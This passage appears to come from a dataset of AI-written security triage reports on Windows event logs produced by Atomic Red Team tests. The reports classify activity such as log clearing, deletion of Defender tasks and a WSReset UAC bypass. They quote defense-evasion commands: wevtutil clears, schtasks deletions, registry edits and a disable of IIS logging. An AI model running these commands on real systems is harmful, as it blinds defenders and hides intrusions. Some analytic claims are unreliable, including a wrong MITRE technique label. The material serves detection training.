   - The Application log shows successful installation of the 'Atomic Red Team Test Installer'. While this may be part of a legitimate administrative action to test defenses, it could also be abused for unauthorized software installations.

5. **Unusual Parent-Child Relationships:**
   - The execution of the `msiexec.exe` with cmd.exe as the parent process under `admin_test`. This usage could be benign or a method to silently install or execute software without user notification.

### Assessment:
- The activity observed in the logs suggests deliberate actions that align with known malicious behaviors, specifically log clearing and software installation using command-line operations in temporary directories. 

### Resolution:
- **MALICIOUS**: The clearing of logs, particularly multiple crucial logs (Security, System, Application, and Windows PowerShell), combined with the use of tools and scripts typically seen in penetration tests (or potential attacks) strongly indicates malicious activity. This warrants immediate investigation and response.

### Guidance:
1. **Immediate Response:**
   - Isolate the host 'Server002' to prevent further potential damage or exfiltration of data.
   - Begin detailed forensic analysis on Server002, capturing memory and disk images for offline analysis.

2. **Investigate User Activity:**
   - Determine if 'admin_test' was legitimately performing these actions or if the account has been compromised.
   
3. **Review Access Logs:**
   - Examine authentication logs to understand how 'admin_test' has been accessing Server002.
   
4. **Coordinate with IT and Mgmt:**
   - Inform relevant departments and manage communication transparently about the incident.
   
5. **Continue Monitoring:**
   - Enhance monitoring and alerting for similar activities across the network.

Act swiftly to prevent any potential data loss and understand the implications on the broader network."
Azure - Eventhub Deletion,"After careful analysis of the Windows event logs provided, here are the findings and assessments:

### Analysis of Suspicious and Malicious Activity:

1. **PowerShell Logs:**

   - The PowerShell logs indicate the execution of a command to **connect to Azure AD** and **remove an event hub** through PowerShell. The use of ConvertTo-SecureString with an empty string for the password and the invocation of Azure-related commands suggest the attempt of unauthorized or scripted actions, which could potentially lead to resource deletion in the Azure environment.
   - The obfuscation style in the log (like the use of secure strings and handling credentials within a script) is often used to mask malicious activities. This command line execution is suspicious.

2. **Sysmon Logs:**

   - Multiple instances of `wevtutil.exe` were executed to clear the event logs (Sysmon, Application, Security, and System logs), as indicated by their deletion, which is evident from both the Sysmon and System log entries. The clearing of logs is a common methodology used by adversaries to cover tracks and erase evidence of activities.
   - The `whoami.exe` and `hostname.exe` executions might be used to gather information about the system and user context, which could further suggest malicious reconnaissance behavior.

3. **System and Security Logs:**

   - The System logs confirm that the `Windows PowerShell` and `System` channels were cleared, and these actions were performed by the user `admin_test`.
   - Similarly, the Security log has also been cleared, as indicated by an Event with ID 1102. This indicates an attempt to hide actions and is typically done to avoid detection.

### Assessment of the Situation:

- The sequence of actions includes connecting to Azure, potentially deleting resources, and performing actions to cover tracks by clearing event logs. This behavior is highly indicative of **malicious activity**. The use of a legitimate account (admin_test) for executing these actions may indicate either account compromise or malicious use by an insider.

### Threats and Risks Identified:

- **Compromised Azure Resources**:** Potential unauthorized access and resource deletion could lead to data loss and service disruption.
- **Log Clearing**:** Evidence of malicious activities is attempted to be hidden, complicating future forensic investigations and negating system auditing capabilities.
- **Possible Privilege Escalation or Insider Threat:** Involvement of the `admin_test` account in executing these suspicious activities suggests a potential insider threat or compromised account.

### Guidance on How to Proceed:

1. **Immediate Incident Response:**
   - Isolate the affected system (`Server002`) to prevent further unauthorized access.
   - Perform a comprehensive review of Azure AD access logs and verify recent activities for unauthorized changes.
   - Change credentials for the `admin_test` account and other related privileged accounts.

2. **Further Investigation:**
   - Conduct a thorough investigation to identify how the compromise occurred, whether via phishing, malware, or insider threat.
   - Evaluate network traffic and other hosts' logs for lateral movement or other compromised systems.

3. **Remediation and Recovery:**
   - Restore deleted resources if applicable and ensure secure configurations moving forward.
   - Enhance logging policies to increase visibility and make the environment more tamper-evident.
   - Educate users on security best practices and potentially implement multi-factor authentication.

### Resolution:

**MALICIOUS** - The logs contain activities that are considered malicious, including unauthorized command executions for potential resource deletion in Azure and intentional clearing of multiple logs to obscure actions."
MSBuild Bypass Using Inline Tasks (C#),"### Analysis of Windows Event Logs

Upon reviewing the provided logs, several indicators suggest the presence of suspicious activity, potentially hinting at malicious behavior. The analysis focuses on identifying anomalies that deviate from standard practices, particularly those involving the execution of unusual processes, command-line syntax, and event log modifications.

#### Suspicious Behavior Detected:

1. **Clearing of Logs:**
   - Event ID 1102 in the Security log indicates that the Security log was cleared by the user `admin_test` on ""2024-10-25 11:02:25"". This is a classic indicator of an attempt to cover tracks.
   - Event ID 104 in the System log also shows that both the System and Windows PowerShell logs were cleared by the same user within a short span. This concurrent clearing of logs suggests actions to erase potential evidence of unauthorized or malicious actions.

2. **Use of `wevtutil` Command:**
   - Multiple instances of the `wevtutil.exe` tool being executed with the `cl` (clear) command for different log channels (Sysmon, Application, and Security) were detected almost concurrently. This further corroborates attempts to obscure activities on the system.

3. **Process Execution Patterns:**
   - The execution of `cmd.exe` with the `/c` switch, followed by the running of `msbuild.exe` on a suspicious path related to Atomic Red Team, a known adversary emulation plan, suggests possible execution of an unauthorized or potentially harmful script (`T1127.001.csproj`).
   - The frequent invocation of Microsoft Edge Update components under the `NT AUTHORITY\SYSTEM` account through different commands and contexts could indicate misuse or exploitation attempts via legitimate processes.

4. **Unusual Command Line Execution:**
   - The command-line execution of processes in rapid succession and without documented rationale (e.g., `whoami.exe`, `hostname.exe`) without clear operational necessity in the logs could point to reconnaissance or script execution activities.

5. **Presence of Atomic Red Team Indicators:**
   - Specific paths and filenames (`AtomicRedTeam`, `T1127.001`) are related to simulated attack techniques from Atomic Red Team, which organizations use to test their security controls. However, their presence in typical operational logs can be a cause for concern if not pre-approved and scheduled.

#### Assessment of Malicious Activity:

Based on the analysis above, the combination of log clearing, execution of possibly malicious scripts, leveraging legitimate software updates for potential exploitation, and the specific command patterns collectively align with scenarios seen in post-compromise actions. The presence of known adversarial testing tools unattended by scheduled testing reviews presents a high risk of unauthorized intrusion attempts aimed at persistence or lateral movement.

### Recommendation:

Given the indicators of abnormal log activity and potential malicious scripts execution, the findings suggest an advanced and possibly persistent threat actor's involvement. Immediate actions should include:

- **Resolution: MALICIOUS**
   - **Containment Steps:** Isolate the affected system from the network to prevent further lateral spread or data exfiltration.
   - **Investigation:** Engage a detailed forensic analysis and review event correlation with centralized logging to understand the full impact and scope.
   - **Remediation:** Reinstate security measures, patch vulnerabilities, and ensure systems are monitored through updated, rigorous detection rules.

Implement further monitoring on similar endpoints and review other system security logs to ascertain the broader organizational impact."
Create ADS PowerShell,"Based on the analysis of the provided logs, certain patterns and events suggest potential malicious activity or at least necessitate further investigation. Here's a detailed breakdown of the notable points:

### Suspicious Activity:
1. **PowerShell Execution with Alternate Data Streams**:
   - The PowerShell logs show the use of alternate data streams (ADS) with commands such as `set-content -path test.txt -stream adstest.txt -value ""test""`. This technique is often used by adversaries to hide their activities or evade detection.
   
2. **Log Cleared Events**:
   - The Security, System, and PowerShell log events contain entries indicating that logs were cleared (EventID 1102 for Security and EventID 104 for System and PowerShell). Log clearing is a common tactic used by attackers to cover their tracks after executing malicious activities.
   
3. **Process Executions**:
   - Several instances of the `wevtutil` utility being executed (as seen in the Sysmon logs). This utility can be used to clear event logs, which aligns with the suspicious log-clearing activity detected.
   - There is also a consistent pattern of the `MicrosoftEdgeUpdate.exe` process being executed frequently and in various paths, which might be worth investigating if it exhibits unusual behavior.

4. **High-Integrity Level Processes**:
   - The logs indicate that many processes, especially PowerShell and `wevtutil.exe`, are running with high integrity levels, which can be indicative of privilege escalation if not aligned with typical user activities.

### Conclusion and Guidance:
The combination of PowerShell scripts using ADS, the clearing of various logs, and the execution of processes associated with log management suggest activities that may be indicative of an attempt to obfuscate and escalate privileges or stage for further malicious operations.

### Resolution:
Given the observations, the resolution is **SUSPICIOUS**. While these logs show advanced tactics often linked to a compromise, further investigation is necessary to determine whether these activities are authorized or are indeed malicious. 

### Next Steps:
1. **Verify the Intent**:
   - Check with the system and network administrators to verify if these activities were part of any authorized maintenance or updates, especially concerning the usage of PowerShell and any script executions.

2. **Investigate the User 'admin_test'**:
   - Conduct a thorough review of the account `admin_test`, especially its recent activities and access patterns. Determine if this account was involved in any unexpected or unauthorized actions.

3. **Isolate and Monitor**:
   - Isolate the impacted system (Server002) to prevent any potential escalation or lateral movement.
   - Deploy enhanced monitoring on similar systems, focusing on log-clearing events and the execution of suspicious PowerShell activities.

4. **Malware and Threat Detection Scans**:
   - Run comprehensive malware scans on Server002 and potentially affected networks and systems to ensure there are no hidden threats or compromised files.

By following these steps, we can confirm the nature of these activities and determine appropriate mitigation actions if they are indeed malicious."

Delete an entire folder - Windows PowerShell,"Upon reviewing the provided Windows event logs, I have identified several key observations that warrant discussion:

### Observations:

1. **Clearing of Event Logs:**
   - EventID 1102 in the Security log indicates that the security log was cleared by the user `admin_test`. This event is highly suspicious as attackers often clear logs to cover their tracks after unauthorized activities.
   - Similar log clearing actions are noted with EventID 104 in the System log for the ""System"" and ""Windows PowerShell"" channels, both executed by `admin_test`.

2. **Wevtutil Usage:**
   - The command `wevtutil.exe cl <channel>` appears multiple times in the Sysmon logs. This is a known technique used to clear event logs (`/cl` stands for ""clear""), which is suspicious and often malicious if performed without legitimate reasons.

3. **PowerShell Activity:**
   - A PowerShell command `Remove-Item -Path $env:TEMP\\deleteme_folder_T1551.004 -Recurse` is present. While removing items is not inherently malicious, the context around this and the timing with other suspicious activities suggest it should be reviewed further, especially considering the log clearance events. The command suggests a script might be involved in further obfuscation or cleanup efforts.

4. **Microsoft Edge Update Activity:**
   - Numerous entries related to `MicrosoftEdgeUpdate.exe` processes are present, which appear to be legitimate update activities. However, without further context (e.g., frequency of updates, recent user activity), it is challenging to discern if this is abnormal.

5. **User Account and Integrity Level:**
   - Most of the activities, especially the suspicious ones like wevtutil and PowerShell, are performed by the user `SERVER002\admin_test` with a high integrity level, indicative of administrative privileges. This might imply privilege abuse if the activity was unauthorized.

### Assessment:

The combination of log clearing, PowerShell script execution, and repeated usage of system-level commands like `wevtutil.exe` are indicators of potential malicious activity. It is suspicious when administrative users clear logs without a clear, documented purpose. The behavior suggests a possible attempt to cover tracks after system manipulation or unauthorized access.

### Recommendation:

1. Immediate containment of `SERVER002` and investigation of the `admin_test` account is critical. This should include validating any scheduled tasks, running processes, and reviewing network activity.
2. Conduct a thorough audit of recently installed or modified software, specifically around Microsoft Edge, to rule out tampered installations.
3. If feasible, restore system logs from backups prior to the clearing events to better understand previous activities.
4. Enhance monitoring of log events to capture similar activities promptly, enabling faster response times for future incidents.

### Resolution:

Based on the information analyzed, the resolution is **MALICIOUS**. The clearing of multiple logs, use of `wevtutil`, and other indicators strongly suggest malicious intentions, potentially indicating a security breach or internal misuse."
Read volume boot sector via DOS device path (PowerShell),"Upon reviewing the provided Windows event logs, here's a detailed analysis of the observations:

1. **Log Clearing Events (System Log)**:
   - Event ID 104 from the System logs indicates that the 'System' and 'Windows PowerShell' event logs were cleared by the user `admin_test` on `Server002`. This user action is captured with three processes `1156`, `1988`, and `3596`.
   - Event ID 1102 in the Security logs also indicates that the Security event log was cleared by the user `admin_test`.

2. **Processes Executed (Sysmon Log)**:
   - There are multiple events involving the `wevtutil.exe` process being executed by the user `SERVER002\admin_test`. This utility is responsible for managing event logs, and its execution is consistent with log clearing activities:
     - Clearing the Application log: `CommandLine"": ""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Application""`
     - Clearing the System log: `CommandLine"": ""\""C:\\Windows\\system32\\wevtutil.exe\"" cl System""`
     - Clearing the Security log: `CommandLine"": ""\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`
     - Clearing the Windows PowerShell log: `CommandLine"": ""\""C:\\Windows\\system32\\wevtutil.exe\"" cl \""Windows PowerShell\""""`

3. **Suspicious PowerShell Activity (PowerShell Log)**:
   - The PowerShell logs show the execution of a PowerShell script using the `powershell.exe` binary. The command attempts to read data from the `C:` drive using a `FileStream` and formats it as hexadecimal. This is typical activity for enumeration or data extraction:
     - `HostApplication=powershell.exe & {$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream ""\\.\C:\"", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer}`

4. **Other Observations (Update and Service Events)**:
   - Windows Defender Security Intelligence updates and Microsoft Edge updates are logged. These activities appear normal and legitimate, associated with routine updating mechanisms.

**Assessment**:
- **Actions Taken by `admin_test`**: The log clearing actions performed by `admin_test` using `wevtutil.exe` are highly suspicious. Clearing event logs can indicate an attempt to cover tracks after unauthorized or malicious activities.
- **PowerShell Execution**: The PowerShell script executed could be indicative of an attempt to gather sensitive information from the system.

**Resolution**: **MALICIOUS**

The combination of log clearing by a user and suspicious PowerShell activity indicates a deliberate attempt to perform unauthorized actions on the system and hide evidence. Immediate steps should be taken to secure the system:

- **Isolate the Affected Machine**: Disconnect the machine from the network to prevent further malicious activity or data exfiltration.
- **User Account Review**: Investigate the `admin_test` account for unauthorized access and reset credentials as needed.
- **Forensic Analysis**: Conduct a thorough forensic investigation of the machine to identify any additional indicators of compromise and ascertain the full extent of the breach.
- **Review Access Logs**: Check user access logs to trace login activities and potential entry points.
- **Update Security Measures**: Strengthen security protocols and ensure that critical event logs cannot be easily cleared without proper authorization."
Delete Windows Defender Scheduled Tasks,"Upon analyzing the provided logs, several suspicious activities and potential signs of malicious behavior are evident.

### Suspicious Activities Identified:

1. **Clearing of Event Logs**:
   - There are multiple occurrences where event logs have been cleared:
     - System: `EventID 104` and `EventID 1102` in Security indicate log clearing by the user ""admin_test"".
   - The use of `wevtutil.exe` for clearing logs, observed in the following commands:
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl Application`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security`
     - `""C:\\Windows\\system32\\wevtutil.exe\"" cl System`
   - Clearing of logs is often associated with an attempt to cover tracks or remove evidence of malicious activity.

2. **Unauthorized Task Manipulation**:
   - The sequence involves querying and deleting scheduled tasks related to Windows Defender, using command lines that modify tasks:
     ```
     schtasks /query /xml /tn \""\\Microsoft\\Windows\\Windows Defender\\...
     schtasks /delete /tn \""\\Microsoft\\Windows\\Windows Defender\\... 
     ```
   - The scripted task manipulation without evidence of legitimate IT management context suggests unauthorized attempts to disable or tamper with defenses.

3. **Timestamp Manipulation**:
   - Kernel events indicate system time changes, a tactic sometimes used to disrupt logging or sync with C2 server timestamps.

4. **Privilege Usage**:
   - The use of high integrity level processes and a privileged account `admin_test` to perform potentially malicious actions is worth noting.

5. **Inconspicuous Commands**:
   - Running commands like `whoami` and `hostname` in close succession to more suspicious activity points to reconnaissance activities typically seen in malicious patterns.

### Assessment of the Situation:
The activities logged suggest coordinated attempts to manipulate defender tasks, clear logs, and possibly do other reconnaissance steps with high privileges. The collective actions are indicative of someone attempting to perform actions without leaving a trace, likely to hinder defensive mechanisms such as Windows Defender and Sysmon logging.

### Identified Threats and Risks:
- The clearing of logs and modification of security task settings poses a significant security risk, potentially indicating an active compromise.
- The malicious use of administrative accounts to execute these tasks underscores the need to reassess account permission structures and enforce stricter monitoring and logging solutions.

### Guidance on How to Proceed:
- **Immediate Containment and Investigation**: Escalate this case for immediate investigation. Lock down the affected systems and accounts (`admin_test`) to prevent further activities.
- **Forensic Analysis**: Initiate detailed forensic operations to capture memory and storage snapshots for deeper analysis.
- **Review and Harden Security Posture**: Evaluate current logging configurations, ensure logs cannot be cleared without appropriate audit trails, and tighten configurations on security solutions to capture such actions more effectively.

### Final Resolution:
Based on the analysis and the evidence of substantial suspicious activities that align with common compromise tactics, the situation should be classified as:

**MALICIOUS**"
Msiexec.exe - Execute the DllUnregisterServer function of a DLL,"Upon reviewing the provided Windows event logs, the following key observations suggest potentially malicious activity:

1. **Log Deletion**: 
   - In the System, Application, and Security logs, multiple log clearing events are highlighted (Event ID `104` in the System log and Event ID `1102` in the Security log). Logs contain an entry where an admin user (`admin_test`) cleared the logs using `wevtutil.exe`, which indicates an attempt to hide activity or cover tracks.
   - The repeated use of `wevtutil.exe` to clear logs is suspicious and aligns with tactics used by attackers to erase forensic evidence of their presence.

2. **Suspicious Use of `wsmprovhost.exe`**:
   - Multiple processes are initiated by `wsmprovhost.exe`. Although `wsmprovhost.exe` is a legitimate Windows process, attackers often use it as a vehicle for executing remotely delivered commands, which suggests potential abuse or compromise of legitimate tools.

3. **Execution of `msiexec.exe` with Unusual Parameters**:
   - The use of cmd.exe /c c:\\windows\\system32\\msiexec.exe with a suspicious DLL (`MSIRunner.dll`) from the `AtomicRedTeam` directory indicates potential execution of a suspicious payload possibly used for red team or adversarial simulation. Such behavior can represent potential unauthorized installations or attacks leveraging misused legitimate installers to run malicious DLLs.

4. **Unusual Processes and File Locations**:
   - Processes such as `MicrosoftEdgeUpdate.exe` and MicrosoftEdgeUpdateComRegisterShell64.exe consistently execute with high integrity levels and are related to system updates. However, their execution in unusual directories (`EUDFB.tmp`) and involvement in multiple instances may require further review to ensure these are not leveraged for persistence or lateral movement, albeit their logging indicates expected update behavior.

5. **Operational Integrity Levels**:
   - The presence of many processes running with 'High' or 'System' integrity levels suggests actions are executed with elevated permissions, which may be necessary in a clean scenario but can also indicate privilege escalation attempts if suspicious contexts are present.

**Final Assessment**:
- **Resolution: MALICIOUS**

The combination of log clearing events performed by an admin account, suspicious use of msiexec.exe with an untrusted DLL, potential exploitation of wsmprovhost.exe, and the stealthy deletion of event logs collectively points towards deliberate actions to obscure malicious behavior. Immediate action is recommended to isolate the host for detailed inspection. 

**Recommended Actions**:
- Immediately quarantine the affected system to prevent further harm.
- Conduct a thorough investigation to recover any cleared logs or utilize backups.
- Restore the system from a known good state, after extracting forensic evidence for further analysis.
- Strengthen monitoring around the affected accounts and processes.
- Review and tighten access controls to prevent unauthorized use of privileged functions and commands."
Allow Simultaneous Download Registry,"Based on the Windows event logs provided for analysis, the following suspicious behaviors have been identified:

1. **Event Log Clearing**: In the Security log, there is an event with EventID 1102 indicating the security event log was cleared by the user ""admin_test"" on ""SERVER002"" at ""2024-10-24 17:33:47.1208665"". In the System log, two EventID 104 events indicate that both the System and Windows PowerShell logs were also cleared by the same user close to the same time. This is a strong indicator of potential malicious activity, as clearing logs can indicate an attempt to cover tracks.

2. **Use of `wevtutil.exe`**: Observations from the Sysmon logs show multiple instances of the `wevtutil.exe` process executed by ""SERVER002\\admin_test"". The command lines include:
   - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
   - `wevtutil.exe cl Application`
   - `wevtutil.exe cl System`
   - `wevtutil.exe cl Security`
   - `wevtutil.exe cl ""Windows PowerShell""`
   
   These commands clear the event logs for various channels and are consistent with the manual clearing entries seen in the Security and System logs.

3. **Registry Modification via Command Line**: The Sysmon log shows the execution of `cmd.exe` by ""SERVER002\\admin_test"", with a command that modifies registry settings related to internet connections, specifically increasing the `MaxConnectionsPerServer` and `MaxConnectionsPer1_0Server` values. This behavior by itself may not be malicious but coupled with other activities raises suspicion.

4. **Abnormal Execution Patterns**: The execution of multiple administrative tools (`hostname.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe`) in quick succession along with log clearing actions suggests possible script automation for malicious purposes or post-exploitation actions.

### Conclusion
Overall, the observed activities, particularly the log file clearing and the specific administrative tasks executed from a user account, ""admin_test"", strongly indicate malicious intent. The combination of these actions is characteristic of an attacker attempting to cover their tracks following unauthorized access or changes to the system.

### Resolution
**MALICIOUS** - The logs contain indicators of clearly malicious activity suggesting possible unauthorized access, log tampering, and system configuration changes.

### Guidance
1. **Immediate Action**: Isolate the affected machine (SERVER002) from the network to prevent further unauthorized actions or data exfiltration.
2. **Investigation**: Conduct a thorough investigation to identify how the access was gained (e.g., compromised credentials, unpatched vulnerabilities) and identify other potentially impacted systems.
3. **Log Review and Monitoring**: Reinstate comprehensive logging and monitoring to detect any future unauthorized actions or similar patterns.
4. **Forensic Analysis**: Collect forensic images of the affected systems for deep analysis and evidence preservation.
5. **Review Access Controls**: Enhance security measures, such as multi-factor authentication and the principle of least privilege, to mitigate potential future risks.
6. **User Education**: Provide training and awareness for users to recognize and respond to phishing and other social engineering tactics to protect their credentials."
Disable Windows IIS HTTP Logging via PowerShell,"After analyzing the provided Windows event logs, several points stand out as potential indicators of suspicious or malicious activity:

1. **Event Clearing:**
   - **Security Logs Cleared (Event ID 1102):** A security log clearance was performed by the user `admin_test` which can often be indicative of an attempt to cover up malicious activity. Legitimate log clearances usually happen with justification, such as for log maintenance or system optimization, and are typically scheduled and documented.
   - **System Logs Cleared (Event ID 104):** Likewise, Windows PowerShell and System logs were also cleared by the same user. This pattern of behavior raises additional suspicion, as the clearing of logs across multiple channels in close succession is not standard in typical administrative operations.

2. **Suspicious PowerShell Command:**
   - A PowerShell command was executed to modify web server settings (`set-WebConfigurationProperty -PSPath ""IIS:\Sites\Default Web Site\"" -filter ""system.webServer/httpLogging"" -name dontLog -value $true`). This command alters logging settings which could be intended to hide further illicit activity. Running such a script without any documented, legitimate purpose can be a tactic used by attackers to evade detection.

3. **Process and Service Behaviors:**
   - Multiple uses of the `wevtutil.exe` tool can be seen for clearing various logs (`wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, `wevtutil.exe cl Security`, etc.) suggesting an effort to perform undetected activities on the target system.
   - Execution of other utilities such as `whoami.exe` and `hostname.exe` typically used to gather system-related information. While not inherently malicious, runs of such utilities can be part of reconnaissance efforts by a threat actor.

Given this analysis, the activity observed in the logs should be classified as **MALICIOUS**. The combination of log clearing activities, suspicious PowerShell usage to alter logging behavior, and the patterns associated with information gathering suggest an attempt to breach, maintain access, or perform deceptive operations on the target host.

### Recommended Next Steps:
- **Isolate the Affected Machine:** To prevent further potential exploitation, isolate `Server002` from the network.
- **Conduct a Full Forensic Investigation:** Retrieve all relevant data from the affected machine for deeper forensic investigation, including memory dumps and disk images.
- **Audit User Accounts and Permissions:** Review account activities, particularly for `admin_test`, to ensure there is no unauthorized usage or access, and reset passwords as necessary.
- **Review Change Management Records:** Cross-reference any legitimate system or administrative changes related to the observed activity.
- **Harden Logging and Monitoring:** Review and enhance logging configurations to prevent unauthorized modifications and ensure monitoring solutions can detect similar activities in the future.
- **Enhance Security Awareness:** Conduct security training focusing on the importance of monitoring internal activities to all personnel involved in IT management and operations.

This comprehensive plan should help secure the environment and prevent similar occurrences."
Enforce Smart Card Authentication Through Registry,"Upon reviewing the provided Windows event logs, the following observations and analysis are made:

1. **Use of `wevtutil.exe`:** The logs show multiple instances of `wevtutil.exe` being used to clear various event logs such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"". This activity is highly suspicious as it suggests an attempt to cover up tracks, indicating potential system compromise or malicious activity. The clearing of logs was performed under the user `SERVER002\\admin_test`.

2. **Registry Modification:** There is evidence of registry modification using `reg.exe`. The command `reg  add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v scforceoption /t REG_DWORD /d 1 /f` was executed. This action is concerning as it changes system policies and can be indicative of attempts to alter security settings, potentially as a persistence mechanism by malicious actors.

3. **Use of Tools like `cmd.exe`, `whoami.exe`, `hostname.exe`:** These tools have been executed, as shown by Sysmon events, which may indicate reconnaissance activities, especially if performed in rapid succession. However, these actions alone, without additional suspicious context, are not immediately indicative of malicious activity but do warrant further examination.

4. **Time Manipulation:** There are logs indicating changes in system time, specifically the alteration of the system clock back in time. This is a known tactic to bypass certain security measures or avoid logging specific events with actual time stamps. This manipulation further lends to the suspect nature of activities on this host.

5. **Processes Executed as `NT AUTHORITY\SYSTEM`:** Several processes such as `MicrosoftEdgeUpdate.exe` are run under `NT AUTHORITY\SYSTEM`, but this by itself is common for legitimate system processes. However, when examined in context with other suspicious activities, the pathway and method of execution should be analyzed to ensure they are legitimate.

### Conclusion:
The activities displayed in the logs suggest a structured attempt to cover tracks by clearing critical event logs, modify sensitive registry entries, and potentially manipulate system time settings to hide sequences of operations on `Server002`. These actions are commonly used in post-exploitation phases once an attacker has acquired access and is setting up for persistence or data exfiltration.

### Resolution:
**MALICIOUS** - Based on the evidence of event log clearing, suspicious registry modifications, and system time manipulation, there is a strong indication of malicious activity on this host.

### Guidance:
1. **Immediate Containment:** Disconnect the affected machine from the network to prevent any further potential damage or data exfiltration.
2. **Forensic Analysis:** Conduct a deep forensic analysis on the system to identify the point of entry and other potential indicators of compromise (IOCs).
3. **Review Access Logs:** Check for any unauthorized access and correlate user activities around the time these logs were generated.
4. **Reverse Changes:** Ensure any suspicious registry changes or policy modifications are reversed to reinforce system security.
5. **Patch and Update:** Ensure the system is up to date with the latest security patches and updates.
6. **Security Monitoring:** Enhance monitoring of the environment to detect similar activities across the network to prevent further incidents."
Decompile Local CHM File,"Upon reviewing the provided Windows event logs, I have identified significant activity indicative of potentially malicious behavior. Here are the key findings from the logs:

1. **Log Clearing Events**: 
   - In the `Security` and `System` logs, Event ID 1102 and multiple Event ID 104 entries indicate that the logs for `Security`, `System`, and `Windows PowerShell` were cleared. These actions occurred around the same time (`2024-10-26 13:05:01`) by the user `SERVER002\admin_test`.
   - Clearing of event logs is a common tactic used by attackers to cover their tracks, making it a strong indicator of malicious activity.

2. **Sysmon Logs - Widespread Usage of `wevtutil`**:
   - Multiple instances of `wevtutil.exe` were executed with the `cl` (clear) command on different channels (e.g., Security, System, Windows PowerShell) by user `SERVER002\admin_test`. This is directly related to the log clearing events noted in the security and system logs, reinforcing the suspicion that there was an intentional effort to erase evidence.

3. **Command Execution and Potential Exploit Activity**:
   - The `cmd.exe` was used to execute `hh.exe` with the `-decompile` option on files under `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.001\src\T1218.001.chm`. This activity is suspicious as it utilizes known techniques for executing arbitrary code through the misuse of legitimate applications (`lolbins`), specifically identified in the MITRE ATT&CK framework as T1218.001 (Disabling Security Tools).

4. **PowerShell Execution**:
   - PowerShell execution is noted but lacks direct evidence in the presented logs. However, the subsequent clearing of PowerShell logs might indicate an attempt to hide potentially harmful PowerShell scripts or commands.

5. **Microsoft Edge Update Activity**:
   - A substantial number of entries relate to `MicrosoftEdgeUpdate.exe` processes, which might initially seem innocuous. However, the volume and context (around the same suspicious timeframe) suggest these processes could be misused or involved in camouflage for other activities. The version executions were legitimate but coinciding with other suspicious actions raise concerns.

**Resolution and Guidance**:
- **MALICIOUS**: Given the presence of log clearing, suspicious command usage, and overlapping indicators with known malicious techniques, this activity is classified as malicious.
- **Immediate Actions**: 
  - Isolate the affected system(s) to prevent potential lateral movement within the network.
  - Conduct a thorough investigation of the system for any additional indicators of compromise, including malware scans and review of system configurations.
  - Check for any changes to user privileges or the addition of unauthorized administrators.
  - Review and update security policies and ensure logging mechanisms are robust and monitored centrally to detect any future unauthorized log-clearing actions.
- **Report and Document**: Ensure that this incident is documented, reported to the appropriate incident response team members, and consider notifying law enforcement if sensitive data breach is confirmed.
"
Setting Shadow key in Registry for RDP Shadowing,"Upon analyzing the provided logs, several indicators suggest potential malicious activity, particularly highlighting a deliberate and potentially unauthorized alteration or clearing of critical system logs. Here's a detailed breakdown of the suspicious activities:

1. **Log Clearing:**
   - The Security event log (EventID 1102) indicates that the logs were cleared by the user ""admin_test."" This action stands out as suspicious because legitimate user activities generally do not involve clearing security logs. Clearing logs is a common tactic used by malicious actors to cover tracks.

2. **Security Privileges:**
   - Several logs indicate that the user ""admin_test"" has been granted a broad range of security privileges, including `SeDebugPrivilege` and `SeBackupPrivilege`. These privileges allow for extensive system manipulation and are typically unnecessary for normal administrative functions.

3. **Process Execution:**
   - The `wevtutil.exe`, used here on several occasions, is a legitimate Windows utility. However, its use to clear various logs (Security, Application, System) by ""admin_test"" immediately after gaining extended privileges is notably suspicious. This activity aligns with tactics used in post-exploitation phases to obscure operational history.
   - Additionally, a PowerShell session executed a command to manipulate firewall rules and system registry settings related to terminal services, which could be an attempt to create backdoors or disable security features.

4. **PowerShell Activity:**
   - The PowerShell logs show the execution of a script modifying firewall rules and registry keys. The script's specifics—enabling Remote Desktop Protocol (RDP) shadowing without direct user interaction—imply a configuration to facilitate unauthorized access.

5. **Network Indicators:**
   - The use of PowerShell in conjunction with CIM sessions indicates an advanced level of lateral movement or host enumeration typically observed in targeted attacks.

**Resolution: MALICIOUS**

The log entries collectively indicate a coordinated attempt to cover tracks, utilize elevated permissions for potentially unauthorized changes, and prepare the system for remote access. These activities closely match known malicious behaviors, including log clearing and unauthorized privilege use. Immediate actions should be taken, including:
- Isolating the affected system from the network to prevent further unauthorized activities.
- Conducting a comprehensive forensic examination to determine the scope and source of the breach.
- Reviewing user account activities and potentially resetting credentials for compromised accounts.
- Enhancing monitoring and alerting for similar activities on the network to prevent recurrence."
UAC Bypass with WSReset Registry Modification,"Based on the detailed analysis of the provided logs, several indicators of potentially malicious activity are evident:

### 1. **PowerShell Activity:**
- **Behavior:** We see the execution of PowerShell scripts with command lines that modify registry keys under HKCU:\Software\Classes. This specific operation is indicative of an attempt to establish persistence or execute an arbitrary command.
- **Indicators:** The command sets the default property of a registry key to execute `cmd.exe /c start cmd.exe`, which is generally used to launch a command shell, a common technique in executing further commands stealthily.

### 2. **Log Clearing Events:**
- **System, Security, and PowerShell Logs Cleared:** 
  - Event ID 104 (System), 1102 (Security), and clearing of Windows PowerShell logs is observed, all performed by the user ""admin_test"". Log clearing is often associated with attempts to cover tracks post-compromise.
  
### 3. **Suspicious Use of `wevtutil.exe`:**
- **Evidence in Sysmon Logs:** Multiple instances of `wevtutil.exe` responsible for clearing event logs were executed by ""admin_test"". The use of `wevtutil.exe` for clearing logs further corroborates intentional log manipulation.

### 4. **Privilege Escalation:**
- **Security Log Indications:** A logon event (ID 4624) for ""admin_test"" shows a successful logon with privileges such as `SeDebugPrivilege`, which can be used to take full control of the operating system.

### 5. **Unusual Process Executions:**
- **Process executions:** The creation of processes like `WSReset.exe` which are typically not known for legitimate administrative tasks are tied to PowerShell commands. Such process execution under the guise of a legitimate process name suggests misuse for hidden operations.
  
